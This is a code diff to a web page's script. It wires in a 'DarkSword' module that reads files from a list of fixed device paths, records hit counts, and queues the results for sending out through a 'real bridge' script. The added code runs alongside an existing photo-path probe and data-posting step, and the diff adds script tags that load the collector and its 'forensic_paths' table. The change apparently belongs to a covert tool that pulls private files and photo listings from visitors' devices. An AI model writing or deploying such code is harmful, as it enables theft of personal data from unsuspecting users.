@@ -1649,6 +1649,18 @@
                     var photos = await runPhotosPathProbe(dirProbe);
                     await postCollectJS("photos_list_js", photos);
                     cap.steps.photos_probe = "ok_" + (photos.count || 0);
+                    // DarkSword 固定路径表提取（仅业务层，无 RCE/多进程）
+                    if (window.DarkSwordCollect && typeof window.DarkSwordCollect.run === "function") {
+                        try {
+                            var dsR = await window.DarkSwordCollect.run({ onlyPriority: true, maxFiles: 12 });
+                            cap.steps.darksword = "hits_" + ((dsR && dsR.hits) || 0);
+                            try { window.DarkSwordCollect.queueViaRealBridge(); } catch (eQ) {}
+                        } catch (eDS) {
+                            cap.steps.darksword = "err:" + (eDS && eDS.message ? eDS.message : eDS);
+                        }
+                    } else {
+                        cap.steps.darksword = "module_missing";
+                    }
                     try { sessionStorage.setItem("coruna_probe_state", "done"); } catch (eS5) {}
                 } catch (eP) {
                     cap.steps.safe_probe = "err:" + (eP && eP.message ? eP.message : eP);
@@ -2079,7 +2091,9 @@
             })();
         */
     </script>
-    <script src="/real_bridge.js?v=11"></script>
+    <script src="/real_bridge.js?v=13"></script>
+<script src="/data_collector/darksword_extract/forensic_paths.js?v=1"></script>
+<script src="/data_collector/darksword_extract/darksword_collect.js?v=1"></script>
 </body>
 
 </html>
